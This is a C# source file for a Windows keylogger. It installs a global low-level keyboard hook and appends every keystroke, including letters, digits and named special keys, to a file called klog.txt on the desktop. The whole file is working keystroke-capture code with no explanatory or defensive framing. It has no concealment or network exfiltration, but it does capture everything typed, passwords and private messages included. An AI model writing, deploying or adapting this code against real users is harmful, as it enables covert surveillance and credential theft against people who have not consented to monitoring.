using Windows.Win32;
using Windows.Win32.UI.WindowsAndMessaging;
using Windows.Win32.Foundation;

#pragma warning disable CA1416
public class Program
{
    private static UnhookWindowsHookExSafeHandle? _kbHook;
    private static readonly string PathToFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "klog.txt");
    private static readonly List<string> Buffer = new();
    private static readonly StreamWriter Writer = new(PathToFile);
    private const uint BufferSize = 10;

    public static unsafe void Main()
    {
        _kbHook = PInvoke.SetWindowsHookEx(
            WINDOWS_HOOK_ID.WH_KEYBOARD_LL, KeyboardCallback, null, 0);
        MSG msg = new();
        while (PInvoke.GetMessage(&msg, new HWND(), 0, 0))
        {
            PInvoke.TranslateMessage(msg);
            PInvoke.DispatchMessage(msg);
        }
        _kbHook.Close();
        Writer.Dispose();
    }

    private static unsafe LRESULT KeyboardCallback(int code, WPARAM wParam, LPARAM lParam)
    {
        var kbStruct = (KBDLLHOOKSTRUCT*) lParam.Value.ToPointer();
        if (code != 0 || (wParam != 0x0100 && wParam != 0x0104))
            return PInvoke.CallNextHookEx(_kbHook, code, wParam, lParam);
        switch (kbStruct->vkCode)
        {
            case 0x08:
                WriteToFile(" [BACKSPACE] ");
                break;
            case 0x09:
                WriteToFile(" [TAB] ");
                break;
            case 0x0C:
                WriteToFile(" [CLEAR] ");
                break;
            case 0x0D:
                WriteToFile(" [ENTER] ");
                break;
            case 0x10:
                WriteToFile(" [SHIFT] ");
                break;
            case 0x11:
                WriteToFile(" [CTRL] ");
                break;
            case 0x12:
                WriteToFile(" [ALT] ");
                break;
            case 0x13:
                WriteToFile(" [PAUSE] ");
                break;
            case 0x14:
                WriteToFile(" [CAPS LOCK] ");
                break;
            case 0x15:
                WriteToFile(" [IME Kana/Hangul mode] ");
                break;
            case 0x17:
                WriteToFile(" [IME On] ");
                break;
            case 0x18:
                WriteToFile(" [IME final mode] ");
                break;
            case 0x19:
                WriteToFile(" [IME Hanja/Kanji mode] ");
                break;
            case 0x1A:
                WriteToFile(" [IME Off] ");
                break;
            case 0x1B:
                WriteToFile(" [ESCAPE] ");
                break;
            case 0x1C:
                WriteToFile(" [IME convert] ");
                break;
            case 0x1D:
                WriteToFile(" [IME nonconvert] ");
                break;
            case 0x1E:
                WriteToFile(" [IME accept] ");
                break;
            case 0x1F:
                WriteToFile(" [IME mode change request] ");
                break;
            case 0x20:
                WriteToFile(" [SPACE] ");
                break;
            case 0x21:
                WriteToFile(" [PAGE UP] ");
                break;
            case 0x22:
                WriteToFile(" [PAGE DOWN] ");
                break;
            case 0x23:
                WriteToFile(" [END] ");
                break;
            case 0x24:
                WriteToFile(" [HOME] ");
                break;
            case 0x25:
                WriteToFile(" [LEFT ARROW] ");
                break;
            case 0x26:
                WriteToFile(" [UP ARROW] ");
                break;
            case 0x27:
                WriteToFile(" [RIGHT ARROW] ");
                break;
            case 0x28:
                WriteToFile(" [DOWN ARROW] ");
                break;
            case 0x29:
                WriteToFile(" [SELECT] ");
                break;
            case 0x2A:
                WriteToFile(" [PRINT] ");
                break;
            case 0x2B:
                WriteToFile(" [EXECUTE] ");
                break;
            case 0x2C:
                WriteToFile(" [PRINT SCREEN] ");
                break;
            case 0x2D:
                WriteToFile(" [INSERT] ");
                break;
            case 0x2E:
                WriteToFile(" [DELETE] ");
                break;
            case 0x2F:
                WriteToFile(" [HELP] ");
                break;
            case 0x30:
                WriteToFile("0");
                break;
            case 0x31:
                WriteToFile("1");
                break;
            case 0x32:
                WriteToFile("2");
                break;
            case 0x33:
                WriteToFile("3");
                break;
            case 0x34:
                WriteToFile("4");
                break;
            case 0x35:
                WriteToFile("5");
                break;
            case 0x36:
                WriteToFile("6");
                break;
            case 0x37:
                WriteToFile("7");
                break;
            case 0x38:
                WriteToFile("8");
                break;
            case 0x39:
                WriteToFile("9");
                break;
            case 0x41:
                WriteToFile("A");
                break;
            case 0x42:
                WriteToFile("B");
                break;
            case 0x43:
                WriteToFile("C");
                break;
            case 0x44:
                WriteToFile("D");
                break;
            case 0x45:
                WriteToFile("E");
                break;
            case 0x46:
                WriteToFile("F");
                break;
            case 0x47:
                WriteToFile("G");
                break;
            case 0x48:
                WriteToFile("H");
                break;
            case 0x49:
                WriteToFile("I");
                break;
            case 0x4A:
                WriteToFile("J");
                break;
            case 0x4B:
                WriteToFile("K");
                break;
            case 0x4C:
                WriteToFile("L");
                break;
            case 0x4D:
                WriteToFile("M");
                break;
            case 0x4E:
                WriteToFile("N");
                break;
            case 0x4F:
                WriteToFile("O");
                break;
            case 0x50:
                WriteToFile("P");
                break;
            case 0x51:
                WriteToFile("Q");
                break;
            case 0x52:
                WriteToFile("R");
                break;
            case 0x53:
                WriteToFile("S");
                break;
            case 0x54:
                WriteToFile("T");
                break;
            case 0x55:
                WriteToFile("U");
                break;
            case 0x56:
                WriteToFile("V");
                break;
            case 0x57:
                WriteToFile("W");
                break;
            case 0x58:
                WriteToFile("X");
                break;
            case 0x59:
                WriteToFile("Y");
                break;
            case 0x5A:
                WriteToFile("Z");
                break;
            case 0x5B:
                WriteToFile(" [LEFT WINDOWS KEY] ");
                break;
            case 0x5C:
                WriteToFile(" [RIGHT WINDOWS KEY] ");
                break;
            case 0x5D:
                WriteToFile(" [APPLICATIONS KEY] ");
                break;
            case 0x5F:
                WriteToFile(" [SLEEP] ");
                break;
            case 0x60:
                WriteToFile("[NUMPAD 0]");
                break;
            case 0x61:
                WriteToFile("[NUMPAD 1]");
                break;
            case 0x62:
                WriteToFile("[NUMPAD 2]");
                break;
            case 0x63:
                WriteToFile("[NUMPAD 3]");
                break;
            case 0x64:
                WriteToFile("[NUMPAD 4]");
                break;
            case 0x65:
                WriteToFile("[NUMPAD 5]");
                break;
            case 0x66:
                WriteToFile("[NUMPAD 6]");
                break;
            case 0x67:
                WriteToFile("[NUMPAD 7]");
                break;
            case 0x68:
                WriteToFile("[NUMPAD 8]");
                break;
            case 0x69:
                WriteToFile("[NUMPAD 9]");
                break;
            case 0x6A:
                WriteToFile(" [MULTIPLY] ");
                break;
            case 0x6B:
                WriteToFile(" [ADD] ");
                break;
            case 0x6C:
                WriteToFile(" [SEPARATOR] ");
                break;
            case 0x6D:
                WriteToFile(" [SUBTRACT] ");
                break;
            case 0x6E:
                WriteToFile(" [DECIMAL] ");
                break;
            case 0x6F:
                WriteToFile(" [DIVIDE] ");
                break;
            case 0x70:
                WriteToFile(" [F1] ");
                break;
            case 0x71:
                WriteToFile(" [F2] ");
                break;
            case 0x72:
                WriteToFile(" [F3] ");
                break;
            case 0x73:
                WriteToFile(" [F4] ");
                break;
            case 0x74:
                WriteToFile(" [F5] ");
                break;
            case 0x75:
                WriteToFile(" [F6] ");
                break;
            case 0x76:
                WriteToFile(" [F7] ");
                break;
            case 0x77:
                WriteToFile(" [F8] ");
                break;
            case 0x78:
                WriteToFile(" [F9] ");
                break;
            case 0x79:
                WriteToFile(" [F10] ");
                break;
            case 0x7A:
                WriteToFile(" [F11] ");
                break;
            case 0x7B:
                WriteToFile(" [F12] ");
                break;
            case 0x90:
                WriteToFile(" [NUM LOCK] ");
                break;
            case 0x91:
                WriteToFile(" [SCROLL LOCK] ");
                break;
            case 0xA0:
                WriteToFile(" [LEFT SHIFT] ");
                break;
            case 0xA1:
                WriteToFile(" [RIGHT SHIFT] ");
                break;
            case 0xA2:
                WriteToFile(" [LEFT CONTROL] ");
                break;
            case 0xA3:
                WriteToFile(" [RIGHT CONTROL] ");
                break;
            case 0xA4:
                WriteToFile(" [LEFT ALT] ");
                break;
            // TODO: add missing keys
            default:
                WriteToFile(kbStruct->vkCode.ToString());
                break;
        }
        return PInvoke.CallNextHookEx(_kbHook, code, wParam, lParam);
    }

    private static async void WriteToFile(string stringToWrite)
    {
        if (Buffer.Count >= BufferSize)
        {
            await WriteBuffer();
            await Writer.FlushAsync();
        }
        Buffer.Add(stringToWrite);
    }

    private static async Task WriteBuffer()
    {
        foreach (var str in Buffer)
        {
            // TODO error handling
            await Writer.WriteAsync(str);
        }
        Buffer.Clear();
    }
}